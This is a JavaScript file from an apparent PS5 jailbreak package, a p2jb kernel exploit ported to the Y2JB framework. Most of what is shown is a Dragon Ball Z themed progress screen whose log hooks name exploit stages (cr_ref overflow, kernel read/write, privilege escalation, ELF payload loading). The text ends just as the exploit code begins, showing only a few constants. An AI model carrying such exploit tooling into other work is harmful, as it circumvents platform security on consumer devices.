/*
 * p2jb-y2jb — Dragon Ball Z · XENOKING EDITION
 * Base: p2jb 2.3 (Y2JB port, stock 4-core ~50 min) — FW 9.00 – 12.40
 *
 * Credits:
 *   - p2jb kernel exploit: Gezine / cheburek3000  (https://github.com/Gezine/Luac0re)
 *   - Y2JB userland framework: Gezine              (https://github.com/Gezine/Y2JB)
 *   - Dragon Ball Z · XENOKING EDITION HUD: XENOKING
 */

// ── DRAGON BALL Z · XENOKING EDITION HUD ─────────────────────────────────────
(function () {
    'use strict';
    try {

        // Google Fonts (Bangers = anime title, Orbitron = power level/timer)
        var lnk = document.createElement('link');
        lnk.rel = 'stylesheet';
        lnk.href = 'https://fonts.googleapis.com/css2?family=Bangers&family=Orbitron:wght@700;900&display=swap';
        document.head.appendChild(lnk);

        var stel = document.createElement('style');
        stel.textContent = [
            '* { box-sizing:border-box; margin:0; padding:0 }',
            'body { background:#000; overflow:hidden }',
            '#dbz { position:fixed; inset:0; z-index:999999; overflow:hidden }',
            '#dbz-cv { position:absolute; inset:0; width:100%; height:100% }',
            // Timer — top right
            '#dbz-timer { position:absolute; top:14px; right:18px; z-index:20;',
            '  font-family:"Orbitron",monospace; font-weight:900; font-size:1.6em;',
            '  color:#fff; letter-spacing:.05em;',
            '  text-shadow:0 0 14px #ff8800,0 0 30px #ff4400 }',
            // Badge — top left
            '#dbz-badge { position:absolute; top:14px; left:18px; z-index:20;',
            '  font-family:"Bangers",Impact,sans-serif; font-size:1.1em;',
            '  color:#ff9900; letter-spacing:.16em; text-transform:uppercase;',
            '  text-shadow:0 0 10px #ff6600,0 0 22px rgba(255,100,0,.4) }',
            '#dbz-badge-x { color:#fff }',
            // Episode label — top center
            '#dbz-ep { position:absolute; top:14px; left:50%; transform:translateX(-50%);',
            '  z-index:20; font-family:"Bangers",Impact,sans-serif; font-size:.85em;',
            '  color:rgba(255,255,255,.38); letter-spacing:.3em; white-space:nowrap }',
            // Stage label — lower third
            '#dbz-stage { position:absolute; bottom:23%; left:50%; transform:translateX(-50%);',
            '  z-index:20; font-family:"Bangers",Impact,sans-serif; font-size:1.3em;',
            '  color:#ffdd00; letter-spacing:.28em; text-transform:uppercase; text-align:center;',
            '  white-space:nowrap; text-shadow:0 0 20px #ff6600,0 0 40px #ff2200 }',
            // Power level
            '#dbz-plabel { position:absolute; bottom:15.5%; left:50%; transform:translateX(-50%);',
            '  z-index:20; font-family:"Bangers",Impact,sans-serif; font-size:.68em;',
            '  color:rgba(255,255,255,.42); letter-spacing:.46em; white-space:nowrap }',
            '#dbz-plv { position:absolute; bottom:8%; left:50%; transform:translateX(-50%);',
            '  z-index:20; font-family:"Orbitron",monospace; font-weight:900; font-size:3.2em;',
            '  color:#fff; letter-spacing:.04em; white-space:nowrap;',
            '  text-shadow:0 0 24px #ff8800,0 0 50px #ff4400 }',
            // Progress bar
            '#dbz-bar-wrap { position:absolute; bottom:4%; left:6%; right:6%; height:6px;',
            '  z-index:20; background:rgba(255,255,255,.06); border-radius:3px; overflow:hidden }',
            '#dbz-bar { height:100%; width:0%; border-radius:3px; transition:width 3s ease;',
            '  background:linear-gradient(90deg,#ff2200,#ff8800 40%,#ffe000 80%,#fff);',
            '  box-shadow:0 0 12px #ff8800 }',
            // Warning
            '#dbz-warn { position:absolute; bottom:1%; left:50%; transform:translateX(-50%);',
            '  z-index:20; font-family:"Orbitron",sans-serif; font-size:.42em;',
            '  color:rgba(255,255,255,.25); letter-spacing:.18em; white-space:nowrap }',
            // Title card
            '#dbz-card { position:absolute; inset:0; z-index:25; pointer-events:none;',
            '  display:flex; align-items:center; justify-content:center; flex-direction:column;',
            '  opacity:0 }',
            '#dbz-card-t { font-family:"Bangers",Impact,sans-serif; font-size:4.2em;',
            '  color:#fff; letter-spacing:.18em; text-align:center; text-transform:uppercase;',
            '  text-shadow:0 0 40px #ff8800,0 0 80px #ff4400 }',
            '#dbz-card-s { font-family:"Orbitron",sans-serif; font-weight:700; font-size:.85em;',
            '  color:rgba(255,200,0,.8); letter-spacing:.35em; margin-top:.4em; text-align:center }',
            // Over 9000 overlay
            '#dbz-9k { position:absolute; inset:0; z-index:26; pointer-events:none;',
            '  display:flex; align-items:center; justify-content:center; flex-direction:column;',
            '  opacity:0 }',
            '#dbz-9k-a { font-family:"Bangers",Impact,sans-serif; font-size:2em;',
            '  color:rgba(255,255,255,.7); letter-spacing:.3em }',
            '#dbz-9k-n { font-family:"Bangers",Impact,sans-serif; font-size:7.5em;',
            '  color:#ffee00; letter-spacing:.08em;',
            '  text-shadow:0 0 40px #ff8800,0 0 100px #ff4400 }',
            '#dbz-9k-b { font-family:"Bangers",Impact,sans-serif; font-size:2.4em;',
            '  color:#fff; letter-spacing:.25em }',
            // Intro
            '#dbz-intro { position:absolute; inset:0; z-index:30; background:#000;',
            '  display:flex; align-items:center; justify-content:center; flex-direction:column }',
            '#dbz-intro-p { font-family:"Bangers",Impact,sans-serif; font-size:1.3em;',
            '  color:rgba(255,255,255,.45); letter-spacing:.4em; margin-bottom:1.1em }',
            '#dbz-intro-m { font-family:"Bangers",Impact,sans-serif; font-size:4.8em;',
            '  color:#fff; letter-spacing:.2em; text-align:center; line-height:1.1;',
            '  text-shadow:0 0 30px rgba(255,140,0,.8) }',
            '#dbz-intro-s { font-family:"Orbitron",sans-serif; font-weight:700; font-size:.82em;',
            '  color:rgba(255,180,0,.55); letter-spacing:.42em; margin-top:.7em }',
            // Done screen
            '#dbz-done { display:none; position:absolute; inset:0; z-index:40;',
            '  align-items:center; justify-content:center; flex-direction:column; background:#000 }',
            '#dbz-done.show { display:flex; animation:dbzF .2s ease-out }',
            '@keyframes dbzF { 0%{background:#cceeff} 100%{background:#000} }',
            '#dbz-beam { position:absolute; top:50%; left:-5%; width:0; height:76px;',
            '  transform:translateY(-50%);',
            '  background:linear-gradient(90deg,transparent,#0099ff 8%,#aaeeff 42%,#fff 50%,#aaeeff 58%,#0099ff 92%,transparent);',
            '  border-radius:0 55px 55px 0;',
            '  box-shadow:0 0 60px #00aaff,0 0 120px rgba(0,100,255,.5) }',
            '@keyframes kame { 0%{width:0;opacity:1} 50%{width:115%;opacity:1} 85%{width:115%;opacity:1} 100%{width:115%;opacity:0} }',
            '#dbz-impact { position:absolute; right:-2%; top:50%; transform:translate(50%,-50%);',
            '  width:0; height:0; border-radius:50%; opacity:0;',
            '  background:radial-gradient(circle,#fff 0%,#aaeeff 25%,transparent 70%) }',
            '@keyframes impact { 0%{width:0;height:0;opacity:1} 35%{width:650px;height:650px;opacity:1} 100%{width:1100px;height:1100px;opacity:0} }',
            '#dbz-vic { z-index:41; font-family:"Bangers",Impact,sans-serif; font-size:6.5em;',
            '  color:#ffee00; letter-spacing:.12em; text-align:center; opacity:0;',
            '  text-shadow:0 0 30px #ff8800,0 0 70px #ff4400,0 0 140px rgba(255,80,0,.3) }',
            '@keyframes vicPop { 0%{opacity:0;transform:scale(.3) skewX(-5deg)} 55%{opacity:1;transform:scale(1.1)} 100%{opacity:1;transform:scale(1)} }',
            '#dbz-vic-fw { z-index:41; font-family:"Orbitron",sans-serif; font-size:.88em;',
            '  color:rgba(255,255,255,.65); letter-spacing:.3em; margin-top:.5em; opacity:0 }',
            '#dbz-vic-by { z-index:41; font-family:"Bangers",Impact,sans-serif; font-size:1.3em;',
            '  color:rgba(255,150,0,.6); letter-spacing:.3em; margin-top:.7em; opacity:0 }',
            '@keyframes vFade { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }',
        ].join('');
        document.head.appendChild(stel);

        // ── DOM ───────────────────────────────────────────────────────────────
        document.body.textContent = '';
        document.body.style.cssText = 'margin:0;padding:0;overflow:hidden;background:#000';

        function mk(tag, id) { var d = document.createElement(tag); if (id) d.id = id; return d; }

        var root    = mk('div',    'dbz');
        var cv      = mk('canvas', 'dbz-cv');
        var timerEl = mk('div',    'dbz-timer');  timerEl.textContent = '00:00';
        var epEl    = mk('div',    'dbz-ep');      epEl.textContent = 'FW 9.00 – 12.40  ·  STOCK P2JB 2.3';
        var stgEl   = mk('div',    'dbz-stage');   stgEl.textContent = 'INITIALIZING...';
        var plLbl   = mk('div',    'dbz-plabel');  plLbl.textContent = 'POWER LEVEL';
        var plvEl   = mk('div',    'dbz-plv');     plvEl.textContent = '0';
        var barWrap = mk('div',    'dbz-bar-wrap');
        var barFill = mk('div',    'dbz-bar');
        barWrap.appendChild(barFill);
        var warnEl  = mk('div',    'dbz-warn');    warnEl.textContent = 'DO NOT CLOSE THIS TAB  —  KEEP WI-FI ON';

        // badge
        var badgeEl = mk('div', 'dbz-badge');
        badgeEl.appendChild(document.createTextNode('DRAGON BALL Z  ·  '));
        var bx = mk('span', 'dbz-badge-x'); bx.textContent = 'XENOKING';
        badgeEl.appendChild(bx);
        badgeEl.appendChild(document.createTextNode('  EDITION'));

        // title card
        var cardEl = mk('div', 'dbz-card');
        var cardT  = mk('div', 'dbz-card-t');
        var cardS  = mk('div', 'dbz-card-s');
        cardEl.appendChild(cardT); cardEl.appendChild(cardS);

        // over 9000
        var o9kEl = mk('div', 'dbz-9k');
        var o9kA  = mk('div', 'dbz-9k-a');  o9kA.textContent = "IT'S OVER";
        var o9kN  = mk('div', 'dbz-9k-n');  o9kN.textContent = '9,000';
        var o9kB  = mk('div', 'dbz-9k-b');  o9kB.textContent = 'POWER LEVEL EXCEEDED!';
        o9kEl.appendChild(o9kA); o9kEl.appendChild(o9kN); o9kEl.appendChild(o9kB);

        // intro
        var introEl = mk('div', 'dbz-intro');
        var introPr = mk('div', 'dbz-intro-p');  introPr.textContent = 'PREVIOUSLY ON DRAGON BALL Z...';
        var introM  = mk('div', 'dbz-intro-m');
        introM.appendChild(document.createTextNode('PS5 JAILBREAK'));
        introM.appendChild(document.createElement('br'));
        introM.appendChild(document.createTextNode('MISSION BEGINS'));
        var introS  = mk('div', 'dbz-intro-s');  introS.textContent = 'XENOKING EDITION';
        introEl.appendChild(introPr); introEl.appendChild(introM); introEl.appendChild(introS);

        // done
        var doneEl   = mk('div', 'dbz-done');
        var beamEl   = mk('div', 'dbz-beam');
        var impactEl = mk('div', 'dbz-impact');
        var vicEl    = mk('div', 'dbz-vic');   vicEl.textContent = 'JAILBROKEN';
        var vicFw    = mk('div', 'dbz-vic-fw');
        var vicBy    = mk('div', 'dbz-vic-by'); vicBy.textContent = 'XENOKING EDITION';
        doneEl.appendChild(beamEl); doneEl.appendChild(impactEl);
        doneEl.appendChild(vicEl);  doneEl.appendChild(vicFw); doneEl.appendChild(vicBy);

        [cv, timerEl, badgeEl, epEl, stgEl, plLbl, plvEl, barWrap, warnEl,
         cardEl, o9kEl, introEl, doneEl].forEach(function(c){ root.appendChild(c); });
        document.body.appendChild(root);

        // ── Canvas setup ──────────────────────────────────────────────────────
        var ctx = cv.getContext('2d');
        var W = 1, H = 1;
        function resize(){ W = cv.width = window.innerWidth||1920; H = cv.height = window.innerHeight||1080; }
        resize();
        try { window.addEventListener('resize', resize); } catch(e){}

        // ── Goku image (real photo from repo) ─────────────────────────────────
        var _gokuLoaded = false, _gokuImg = new Image();
        _gokuImg.crossOrigin = 'anonymous';
        _gokuImg.onload = function(){ _gokuLoaded = true; };
        _gokuImg.src = 'https://raw.githubusercontent.com/XENOKING123/XENOKING/main/client/public/goku.jpg';

        // ── Animation state ───────────────────────────────────────────────────
        var _t = 0;
        var _start = Date.now();
        var _logPct = 0;       // driven by log interception
        var _intens  = 0;      // 0-1, grows over time
        var _plTarget = 0, _plCur = 0;
        var _over9kFired = false;
        var _introDone  = false, _introAlpha = 1;
        var _cardAlpha  = 0, _cardPhase = 0, _cardHold = 0;  // 0=idle 1=in 2=hold 3=out
        var _o9kAlpha   = 0, _o9kPhase = 0, _o9kHold = 0;
        var _done = false, _failed = false;
        var _lastScene = '';

        // Particles
        var PN = 170;
        var px=[], py=[], pvx=[], pvy=[], plf=[], pdc=[], psz=[], pblu=[], pwht=[];
        function pReset(i){
            var sp = 50 + _intens*340;
            px[i] = W/2 + (Math.random()-.5)*sp;
            py[i] = H*.57 + (Math.random()-.5)*55;
            var ang = -Math.PI/2 + (Math.random()-.5)*2.3;
            var spd = 1.4 + Math.random()*5*(0.25+_intens);
            pvx[i] = Math.cos(ang)*spd; pvy[i] = Math.sin(ang)*spd;
            plf[i] = .55 + Math.random()*.45;
            pdc[i] = .005 + Math.random()*.013;
            psz[i] = 2 + Math.random()*5*(0.25+_intens*.75);
            var r = Math.random(); pblu[i] = r<.15; pwht[i] = r>.85;
        }
        for(var pi=0;pi<PN;pi++){ px[pi]=py[pi]=pvx[pi]=pvy[pi]=0; plf[pi]=Math.random(); pdc[pi]=.01; psz[pi]=2; pblu[pi]=pwht[pi]=false; pReset(pi); }

        // Clouds (3 parallax layers)
        var CL = [];
        for(var ci=0;ci<48;ci++) CL.push({ x:Math.random()*4000-1000, y:Math.random()*500, r:40+Math.random()*180, spd:(0.15+Math.random()*.6)*(ci%2?1:-1), a:0.04+Math.random()*.12, layer:ci%3 });

        // Aura rings
        var RN=5, rr=[], rl=[], rspd2=[];
        for(var ri=0;ri<RN;ri++){ rr[ri]=ri*(380/RN); rl[ri]=1-ri/RN; rspd2[ri]=2+ri*.6; }

        // Debris
        var DN=22, dx_=[],dy_=[],dvx_=[],dvy_=[],drt_=[],dsz_=[],dal_=[];
        for(var di=0;di<DN;di++){
            dx_[di]=Math.random()*2000-1000; dy_[di]=Math.random()*600;
            dvx_[di]=(Math.random()-.5)*2; dvy_[di]=(Math.random()-.5)*1.5;
            drt_[di]=Math.random()*Math.PI*2; dsz_[di]=3+Math.random()*12; dal_[di]=.1+Math.random()*.3;
        }

        function lerp(a,b,x){ return a+(b-a)*x; }
        function clamp(v,a,b){ return Math.max(a,Math.min(b,v)); }

        function getScene(eMin){
            if (!_introDone) return 'intro';
            if (eMin < 5)  return 'sensing';
            if (eMin < 15) return 'charging';
            if (eMin < 25) return 'ssj';
            if (eMin < 35) return 'ssj2';
            if (eMin < 45) return 'ssj3';
            return 'ssj_blue';
        }

        function showCard(title, sub, hold){
            cardT.textContent = title; cardS.textContent = sub||'';
            _cardAlpha=0; _cardPhase=1; _cardHold=hold||130;
        }

        function lgt(x1,y1,x2,y2,a){
            ctx.save();
            ctx.strokeStyle='rgba(200,230,255,'+a+')';
            ctx.lineWidth=1.8; ctx.shadowColor='#bbddff'; ctx.shadowBlur=14;
            ctx.beginPath(); ctx.moveTo(x1,y1);
            for(var si=1;si<8;si++) ctx.lineTo(lerp(x1,x2,si/8)+(Math.random()-.5)*95, lerp(y1,y2,si/8)+(Math.random()-.5)*38);
            ctx.lineTo(x2,y2); ctx.stroke(); ctx.restore();
        }

        function gokuCanvas(cx, cy){
            ctx.save(); ctx.fillStyle='#000';
            ctx.globalAlpha=.38;
            ctx.beginPath(); ctx.ellipse(cx,cy+115,78,15,0,0,Math.PI*2); ctx.fill();
            ctx.globalAlpha=1;
            ctx.beginPath(); ctx.arc(cx,cy-82,31,0,Math.PI*2); ctx.fill();
            ctx.fillRect(cx-20,cy-53,40,85); ctx.fillRect(cx-19,cy+32,14,62); ctx.fillRect(cx+5,cy+32,14,62);
            ctx.save(); ctx.translate(cx,cy-12); ctx.rotate(-.52); ctx.fillRect(-62,-6,62,12); ctx.restore();
            ctx.save(); ctx.translate(cx,cy-12); ctx.rotate(.52);  ctx.fillRect(0,-6,62,12); ctx.restore();
            var gold = Math.max(0,(_intens-.25)*1.35);
            ctx.fillStyle='rgb('+Math.floor(lerp(20,255,gold))+','+Math.floor(lerp(14,200,gold))+',0)';
            [[0,-116,8,28],[12,-111,7,24],[-13,-110,7,23],[25,-103,6,18],[-25,-101,6,17]].forEach(function(s){
                ctx.beginPath(); ctx.moveTo(cx+s[0]-s[2],cy+s[1]+s[3]); ctx.lineTo(cx+s[0],cy+s[1]); ctx.lineTo(cx+s[0]+s[2],cy+s[1]+s[3]); ctx.closePath(); ctx.fill();
            });
            ctx.restore();
        }

        // ── Main animation frame ──────────────────────────────────────────────
        function frame(){
            _t++;
            var eMs  = Date.now() - _start;
            var eMin = eMs / 60000;
            var eSec = eMs / 1000;

            _intens = Math.min(1, eMin / 42);
            if (_logPct < 90) _logPct = Math.min(90, 5 + (eMin/50)*85);

            // Power level: crosses 9000 at ~2 min
            _plTarget = Math.min(999999999, Math.floor(Math.pow(eSec/40, 2.5)*50));
            _plCur += (_plTarget - _plCur) * .04;

            // Fire Over 9000
            if (!_over9kFired && _plCur >= 9000){
                _over9kFired = true;
                _o9kPhase = 1; _o9kAlpha = 0; _o9kHold = 0;
            }

            // Intro fade
            if (!_introDone && eSec > 3.5){
                _introAlpha = Math.max(0, _introAlpha - .025);
                introEl.style.opacity = _introAlpha;
                if (_introAlpha <= 0){
                    _introDone = true;
                    introEl.style.display = 'none';
                    showCard('THE AWAKENING', 'PS5 JAILBREAK BEGINS', 160);
                }
            }

            // Scene transitions
            var scene = getScene(eMin);
            if (scene !== _lastScene){
                _lastScene = scene;
                var sc = { sensing:['THE ENEMY DRAWS NEAR','KI SENSORS ONLINE'], charging:['POWER BUILDING','CR_REF OVERFLOW IN PROGRESS'], ssj:['SUPER SAIYAN AWAKENED','TRANSCENDING ALL LIMITS'], ssj2:['BEYOND SUPER SAIYAN','THE KERNEL TREMBLES'], ssj3:['SUPER SAIYAN 3','HAIR GROWS — EYEBROWS GONE'], ssj_blue:['SUPER SAIYAN BLUE','GODLY KI UNLEASHED'] };
                if (sc[scene]) showCard(sc[scene][0], sc[scene][1], 140);
            }

            // Title card FSM
            if (_cardPhase===1){ _cardAlpha=Math.min(1,_cardAlpha+.05); if(_cardAlpha>=1) _cardPhase=2; }
            else if (_cardPhase===2){ _cardHold--; if(_cardHold<=0) _cardPhase=3; }
            else if (_cardPhase===3){ _cardAlpha=Math.max(0,_cardAlpha-.025); if(_cardAlpha<=0) _cardPhase=0; }
            cardEl.style.opacity = _cardAlpha;

            // Over 9000 FSM
            if (_o9kPhase===1){ _o9kAlpha=Math.min(1,_o9kAlpha+.06); _o9kHold++; if(_o9kHold>110) _o9kPhase=2; }
            else if (_o9kPhase===2){ _o9kAlpha=Math.max(0,_o9kAlpha-.03); if(_o9kAlpha<=0) _o9kPhase=0; }
            o9kEl.style.opacity = _o9kAlpha;
            o9kEl.style.background = 'rgba(0,0,0,'+(_o9kAlpha*.88)+')';

            if (_done){ requestAnimationFrame(frame); return; }

            // ── DRAW ─────────────────────────────────────────────────────────
            ctx.clearRect(0,0,W,H);

            // Sky
            var sg = ctx.createRadialGradient(W/2,H*.44,0, W/2,H*.44, Math.max(W,H)*.88);
            var c0,c1,c2;
            if (scene==='sensing')       { c0='rgba(28,0,48,1)';  c1='rgba(6,0,18,1)';   c2='rgba(0,0,0,1)'; }
            else if (scene==='charging') { c0='rgba(85,18,0,1)';  c1='rgba(18,4,28,1)';  c2='rgba(0,0,0,1)'; }
            else if (scene==='ssj')      { c0='rgba(175,75,0,1)'; c1='rgba(45,8,8,1)';   c2='rgba(0,0,0,1)'; }
            else if (scene==='ssj2')     { c0='rgba(215,95,0,1)'; c1='rgba(75,18,0,1)';  c2='rgba(0,0,0,1)'; }
            else if (scene==='ssj3')     { c0='rgba(255,135,15,1)';c1='rgba(115,28,0,1)';c2='rgba(4,0,0,1)'; }
            else if (scene==='ssj_blue') { c0='rgba(90,155,255,1)';c1='rgba(8,28,115,1)';c2='rgba(0,0,8,1)'; }
            else                         { c0='rgba(4,0,8,1)';    c1='rgba(0,0,0,1)';    c2='rgba(0,0,0,1)'; }
            sg.addColorStop(0,c0); sg.addColorStop(.5,c1); sg.addColorStop(1,c2);
            ctx.fillStyle=sg; ctx.fillRect(0,0,W,H);

            // Clouds
            var cBase = scene==='ssj_blue';
            CL.forEach(function(c){
                c.x += c.spd*(0.35+_intens*.9);
                if(c.x>W+250) c.x=-450; if(c.x<-450) c.x=W+250;
                var cg=ctx.createRadialGradient(c.x,c.y,0,c.x,c.y,c.r);
                var ca=c.a*clamp(_intens*.7,.04,.6);
                cg.addColorStop(0, cBase?'rgba(100,150,255,'+ca+')':'rgba(200,75,0,'+ca+')');
                cg.addColorStop(1, cBase?'rgba(50,80,200,0)':'rgba(150,38,0,0)');
                ctx.fillStyle=cg; ctx.beginPath(); ctx.arc(c.x,c.y,c.r,0,Math.PI*2); ctx.fill();
            });

            // Ground
            var gg=ctx.createLinearGradient(0,H*.72,0,H);
            gg.addColorStop(0,'rgba(0,0,0,.58)'); gg.addColorStop(1,'rgba(0,0,0,.88)');
            ctx.fillStyle=gg; ctx.fillRect(0,H*.72,W,H*.28);

            // Cracks
            if(_intens>.18){
                var ca2=(_intens-.18)*.95;
                for(var ci2=0;ci2<16;ci2++){
                    var ang2=(ci2/16)*Math.PI-Math.PI/2+.1, cl2=50+ci2*58;
                    ctx.strokeStyle=cBase?'rgba(70,145,255,'+ca2+')':'rgba(255,95,0,'+ca2+')';
                    ctx.lineWidth=1+(ci2%3)*.5;
                    ctx.beginPath(); ctx.moveTo(W/2,H*.72);
                    ctx.lineTo(W/2+Math.cos(ang2)*cl2, H*.72+Math.abs(Math.sin(ang2))*cl2*.23); ctx.stroke();
                }
            }

            // Rings
            var maxR=155+_intens*440;
            for(var ri2=0;ri2<RN;ri2++){
                rr[ri2]+=rspd2[ri2]*(1+_intens*2.6); if(rr[ri2]>maxR) rr[ri2]=0;
                rl[ri2]=1-rr[ri2]/maxR;
                var rg=ctx.createRadialGradient(W/2,H*.5,rr[ri2]*.55, W/2,H*.5,rr[ri2]);
                var ra=rl[ri2]*_intens*.52;
                rg.addColorStop(0,'rgba(255,200,0,0)');
                rg.addColorStop(.65,cBase?'rgba(100,180,255,'+ra+')':'rgba(255,115,0,'+ra+')');
                rg.addColorStop(1,'rgba(255,50,0,0)');
                ctx.fillStyle=rg; ctx.beginPath(); ctx.arc(W/2,H*.5,rr[ri2],0,Math.PI*2); ctx.fill();
            }

            // Central aura glow
            var ar=118+Math.sin(_t*.04)*24+_intens*295;
            var ag=ctx.createRadialGradient(W/2,H*.5,0, W/2,H*.5,ar);
            ag.addColorStop(0, cBase?'rgba(190,235,255,'+(0.18+_intens*.52)+')':'rgba(255,255,170,'+(0.18+_intens*.52)+')');
            ag.addColorStop(.35,cBase?'rgba(70,145,255,'+(0.1+_intens*.32)+')':'rgba(255,135,0,'+(0.1+_intens*.32)+')');
            ag.addColorStop(1,'rgba(0,0,0,0)');
            ctx.fillStyle=ag; ctx.beginPath(); ctx.arc(W/2,H*.5,ar,0,Math.PI*2); ctx.fill();

            // Goku
            if (_gokuLoaded){
                var iw=_gokuImg.naturalWidth, ih=_gokuImg.naturalHeight;
                var sc2=Math.min(W*.4/iw, H*.84/ih);
                var dw=iw*sc2, dh=ih*sc2, gx=W/2-dw/2, gy=H*.04;
                ctx.save();
                ctx.drawImage(_gokuImg, gx, gy, dw, dh);
                if(_intens>.04){
                    ctx.globalCompositeOperation='screen';
                    ctx.fillStyle=cBase?'rgba(80,160,255,'+(_intens*.52)+')':'rgba(255,'+Math.floor(lerp(130,225,_intens))+',0,'+(_intens*.52)+')';
                    ctx.fillRect(gx,gy,dw,dh);
                }
                ctx.restore();
            } else {
                gokuCanvas(W/2, H*.6);
            }

            // Particles
            for(var i=0;i<PN;i++){
                if(_intens<.04&&i>15){ plf[i]=0; continue; }
                pvx[i]*=.99; pvy[i]-=.07; px[i]+=pvx[i]; py[i]+=pvy[i];
                plf[i]-=pdc[i]; if(plf[i]<=0) pReset(i);
                var pc=pwht[i]?'255,255,255':pblu[i]||cBase?'100,180,255':'255,'+(135+Math.floor(Math.random()*85))+',0';
                ctx.beginPath(); ctx.arc(px[i],py[i],psz[i]*plf[i],0,Math.PI*2);
                ctx.fillStyle='rgba('+pc+','+plf[i]+')'; ctx.fill();
            }

            // Debris
            if(_intens>.28){
                for(var di2=0;di2<DN;di2++){
                    dx_[di2]+=dvx_[di2]; dy_[di2]+=dvy_[di2]; drt_[di2]+=.022;
                    if(dx_[di2]>W*1.3||dx_[di2]<-W*.3||dy_[di2]<-120){ dx_[di2]=W/2+(Math.random()-.5)*420; dy_[di2]=H*.76; dvx_[di2]=(Math.random()-.5)*2; dvy_[di2]=-.5-Math.random()*2*_intens; }
                    ctx.save(); ctx.translate(dx_[di2],dy_[di2]); ctx.rotate(drt_[di2]);
                    ctx.fillStyle='rgba(140,88,28,'+(dal_[di2]*(_intens-.28))+')';
                    ctx.fillRect(-dsz_[di2]/2,-dsz_[di2]/2,dsz_[di2],dsz_[di2]/3); ctx.restore();
                }
            }

            // Speed lines burst
            if(Math.random()<.03*_intens&&_intens>.35){
                ctx.save(); ctx.globalAlpha=.14; ctx.strokeStyle='#fff'; ctx.lineWidth=1;
                for(var li2=0;li2<32;li2++){ var la=Math.random()*Math.PI*2, lr1=55+Math.random()*145, lr2=lr1+175+Math.random()*285; ctx.beginPath(); ctx.moveTo(W/2+Math.cos(la)*lr1,H*.5+Math.sin(la)*lr1); ctx.lineTo(W/2+Math.cos(la)*lr2,H*.5+Math.sin(la)*lr2); ctx.stroke(); }
                ctx.restore();
            }

            // Lightning
            if(Math.random()<.022*(_intens+.05))
                lgt(W/2+(Math.random()-.5)*420,H*.08, W/2+(Math.random()-.5)*210,H*.68, .42+Math.random()*.45);

            requestAnimationFrame(frame);
        }
        requestAnimationFrame(frame);

        // ── Timer ─────────────────────────────────────────────────────────────
        setInterval(function(){
            try {
                var s=Math.floor((Date.now()-_start)/1000), m=Math.floor(s/60);
                timerEl.textContent=(m<10?'0':'')+m+':'+((s%60)<10?'0':'')+(s%60);
            } catch(e){}
        }, 500);

        // ── Power level smooth display ─────────────────────────────────────────
        setInterval(function(){
            try {
                _plCur+=(_plTarget-_plCur)*.05;
                var v=Math.floor(_plCur);
                plvEl.textContent = v>=1000 ? v.toLocaleString() : String(v);
                // glow intensifies with value
                var gl=Math.min(1,v/999999999);
                plvEl.style.textShadow='0 0 '+(24+gl*60)+'px #ff8800,0 0 '+(50+gl*120)+'px #ff4400';
            } catch(e){}
        }, 50);

        // ── Internals: jump progress ───────────────────────────────────────────
        function jumpTo(pct, stageName, cardTitle){
            if(_logPct >= pct) return;
            _logPct = pct;
            barFill.style.width = pct + '%';
            if(stageName) stgEl.textContent = stageName;
            if(cardTitle) showCard(cardTitle, '', 100);
        }

        function triggerComplete(){
            if(_done) return;
            _done = true;
            _logPct = 100; barFill.style.width = '100%';
            doneEl.classList.add('show');
            beamEl.style.animation = 'kame 2.2s ease-out forwards';
            setTimeout(function(){ impactEl.style.animation='impact .9s ease-out forwards'; }, 1100);
            setTimeout(function(){
                vicEl.style.animation='vicPop .7s ease-out forwards'; vicEl.style.opacity='1';
                setTimeout(function(){
                    vicFw.style.animation='vFade .5s ease forwards'; vicFw.style.opacity='1';
                    setTimeout(function(){ vicBy.style.animation='vFade .5s ease forwards'; vicBy.style.opacity='1'; },500);
                },700);
            },1700);
        }

        function triggerFail(){
            stgEl.textContent='EXPLOIT FAILED — RELOAD TAB';
            stgEl.style.color='#ff4444';
            barFill.style.background='#ff4444';
        }

        // ── Log intercept (hooks into stock p2jb ulog calls) ──────────────────
        var _origLog = window.log || function(){};
        window.log = function(msg){
            var s = String(msg||'');
            try {
                if      (s.indexOf('[p2jb] stage0:')!==-1 && _logPct<10) jumpTo(10,'OVERFLOW IN PROGRESS','');
                else if (s.indexOf('[p2jb] stage1:')!==-1)               jumpTo(91,'PROC FILEDESC LEAKED','PIERCING THE VEIL');
                else if (s.indexOf('[p2jb] stage2:')!==-1)               jumpTo(93,'PIPE PTRS ACQUIRED','KERNEL GATE OPENED');
                else if (s.indexOf('kernel r/w achieved')!==-1)           jumpTo(95,'KERNEL R/W UNLOCKED','UNLIMITED POWER');
                else if (s.indexOf('[p2jb] stage4:')!==-1)               jumpTo(97,'PRIVILEGES ESCALATED','ASCENDING...');
                else if (s.indexOf('jailbreak ok')!==-1)                  jumpTo(98,'JAILBREAK SECURED','FINAL FORM ACHIEVED');
                else if (s.indexOf('[p2jb] stage6:')!==-1)               jumpTo(99,'LOADING ELF PAYLOAD','PAYLOAD INCOMING');
                else if (s.indexOf('[p2jb] stage7:')!==-1)               jumpTo(99.5,'PATCHING DYNLIB','');
                else if (s.indexOf('p2jb complete')!==-1)                 triggerComplete();
                else if (s.indexOf('FATAL')!==-1 || s.indexOf('FAILED')!==-1) triggerFail();
            } catch(e){}
            return _origLog.apply(this, arguments);
        };

        var _origNotif = window.send_notification || function(){};
        window.send_notification = function(msg){
            var s = String(msg||'').toLowerCase();
            try {
                if(s.indexOf('fail')!==-1||s.indexOf('error')!==-1) triggerFail();
                else if(s.indexOf('complete')!==-1||s.indexOf('done')!==-1) triggerComplete();
            } catch(e){}
            return _origNotif.apply(this, arguments);
        };

    } catch(e){}
})();
// ── END HUD — stock p2jb 2.3 follows, completely unmodified ──────────────────
/*
 * p2jb-y2jb - PS5 jailbreak port to Y2JB (YouTube/JS), tested on FW 11.60,
 *            offsets bundled for FW 9.00 - 12.40.
 * MIT License - see LICENSE.
 *
 * Credits:
 *   - p2jb kernel exploit (cr_ref overflow via kqueueex): Gezine / cheburek3000
 *     (https://github.com/Gezine/Luac0re)
 *   - Y2JB userland framework: Gezine (https://github.com/Gezine/Y2JB)
 *   - elfldr_1320 ELF loader binary: Gezine
 *   - notmaj0r remote_lua_loader p2jb port (secondary reference)
 *
 * Usage: see README.md.
 */

(async function () {
    try {
        const p2jb_version = "P2JB 2.3 (Y2JB port)";

        const PAGE_SIZE = 0x4000;

        const AF_UNIX = 1n;
        const AF_INET6 = 28n;
        const SOCK_STREAM = 1n;
        const IPPROTO_IPV6 = 41n;
        const IPV6_RTHDR = 51n;

        const SOL_SOCKET = 0xffffn;
        const SO_SNDBUF = 0x1001n;

